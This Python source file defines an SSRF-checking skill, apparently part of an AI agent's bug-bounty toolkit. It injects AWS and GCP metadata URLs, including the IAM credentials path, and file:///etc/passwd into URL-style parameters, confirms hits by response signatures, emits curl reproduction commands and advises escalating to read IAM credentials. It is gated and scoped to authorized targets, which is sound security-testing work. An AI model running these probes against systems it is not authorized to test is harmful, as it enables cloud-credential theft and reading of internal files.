"""SSRF — Server-Side Request Forgery: making the server fetch an attacker-chosen internal resource.

check_ssrf injects internal URLs into fetch-style parameters and confirms the bug when the response
contains an unmistakable internal-resource signature — cloud metadata (AWS/GCP, which leaks IAM
credentials = critical), or a local file via file:// (root:...:0:0:). A signature in the injected
response but not the clean baseline is a confirmed, reflected SSRF. SSRF is a top-payout
class (cloud cred theft, internal pivot, RCE). Active (sends crafted requests) so it is gated.
Pure-stdlib (urllib), CI-safe, $0. Blind/OOB SSRF needs an out-of-band collaborator — noted, manual.
"""

from __future__ import annotations

import asyncio
import re
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from friday.skills.registry import skill

# (probe URL, success signature, label, severity). Signatures are specific enough that a match means
# the server actually fetched the internal resource — not an echo of our payload.
_TARGETS: list[tuple[str, re.Pattern[str], str, str]] = [
    ("http://169.254.169.254/latest/meta-data/",
     re.compile(r"\b(ami-id|instance-id|local-ipv4|iam/|public-keys)\b", re.I),
     "AWS instance metadata", "critical"),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document",
     re.compile(r'"accountId"|"instanceId"|"privateIp"', re.I),
     "AWS instance identity document", "critical"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     re.compile(r"AccessKeyId|SecretAccessKey|Token", re.I),
     "AWS IAM credentials", "critical"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     re.compile(r"computeMetadata|Metadata-Flavor|/instance/", re.I),
     "GCP instance metadata", "critical"),
    ("file:///etc/passwd",
     re.compile(r"root:.*?:0:0:", re.I),
     "internal file read via file://", "high"),
]
# Parameters that commonly carry a URL the server will fetch.
_SSRF_PARAMS = frozenset(
    {"url", "uri", "link", "src", "dest", "destination", "redirect", "redirect_uri", "callback",
     "target", "u", "host", "domain", "feed", "proxy", "fetch", "load", "image", "img", "file",
     "path", "continue", "next", "data", "reference", "site", "to", "out", "resource", "remote",
     "download", "preview", "open", "page", "view", "webhook", "api", "endpoint"}
)
_DEFAULT_APPEND = ("url", "uri", "dest", "callback", "target", "next", "image", "file")


def _set_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


def _probe(url: str) -> tuple[int, str, str | None]:
    req = urllib.request.Request(url, headers={"User-Agent": "sutra-ssrf/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:  # noqa: S310 — authorized target
            return r.status, r.read(500_000).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as e:
        try:
            body = e.read(500_000).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            body = ""
        return e.code, body, None
    except (urllib.error.URLError, OSError) as e:
        return 0, "", str(e)[:160]


@skill(
    name="check_ssrf",
    description=(
        "Test a URL for SSRF (Server-Side Request Forgery) — making the server fetch an "
        "attacker-chosen internal resource. Injects cloud-metadata and file:// URLs into "
        "fetch-style params (url, uri, dest, callback, image, …) and confirms when the response "
        "has an internal-resource signature (AWS/GCP metadata → IAM credential theft = critical; "
        "file:///etc/passwd = high). Confirmed-only (signature not in baseline). Pass param= for "
        "one. Active (crafted requests) — authorized targets only; blind/OOB SSRF needs a manual "
        "out-of-band collaborator."
    ),
    auto_confirm=False,  # sends crafted internal-URL payloads — gated
    timeout_s=90,
)
async def check_ssrf(url: str, param: str = "") -> dict[str, Any]:
    """Probe a URL's fetch-style parameters for reflected SSRF.

    url: the target URL (ideally one with a url/callback/image-style param).
    param: optional single parameter to test; otherwise SSRF-prone params are used, or a common set.
    """
    url = (url or "").strip()
    if not url:
        return {"error": "no url to test"}
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    existing = [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]
    if param.strip():
        candidates = [param.strip()]
    else:
        candidates = [p for p in existing if p.lower() in _SSRF_PARAMS] or list(_DEFAULT_APPEND)

    def _run() -> tuple[list[dict[str, Any]], bool]:
        _, baseline, berr = _probe(url)
        reachable = berr is None
        hits: list[dict[str, Any]] = []
        for p in candidates:
            found = False
            for probe_url, sig, label, sev in _TARGETS:
                status, body, err = _probe(_set_param(url, p, probe_url))
                if err is None:
                    reachable = True
                m = sig.search(body or "")
                if m and not sig.search(baseline or ""):  # signature is new vs the clean baseline
                    hits.append({"param": p, "probe": probe_url, "label": label, "severity": sev,
                                 "status": status, "evidence": m.group(0)[:80]})
                    found = True
                    break  # this param confirmed — stop trying targets on it
            if found:
                continue
        return hits, reachable

    hits, reachable = await asyncio.to_thread(_run)
    if not reachable:
        return {"error": f"could not reach {url}", "url": url}

    order = {"critical": 0, "high": 1}
    hits.sort(key=lambda h: order.get(h["severity"], 9))
    findings = [
        {
            "id": "ssrf",
            "severity": h["severity"],
            "matched_at": _set_param(url, h["param"], h["probe"]),
            "name": f"SSRF via '{h['param']}' → {h['label']}",
            "description": (
                f"The '{h['param']}' parameter makes the server fetch attacker-supplied URLs: "
                f"probing {h['probe']} returned {h['label']} (HTTP {h['status']}, matched "
                f"'{h['evidence']}'). SSRF enables cloud-credential theft, internal pivoting and "
                "sometimes RCE — escalate (e.g. read IAM creds) to prove impact."
            ),
            "curl": f"curl -s '{_set_param(url, h['param'], h['probe'])}'",
        }
        for h in hits
    ]

    return {
        "url": url,
        "tested_params": candidates,
        "hits": hits,
        "findings": findings,
        "vulnerable": bool(findings),
        "note": (
            "Confirmed by an internal-resource signature. For BLIND SSRF (no reflection), retest "
            "with an out-of-band collaborator URL and watch for the callback. Escalate metadata "
            "access to IAM credentials before reporting; never touch data outside scope."
        ),
    }
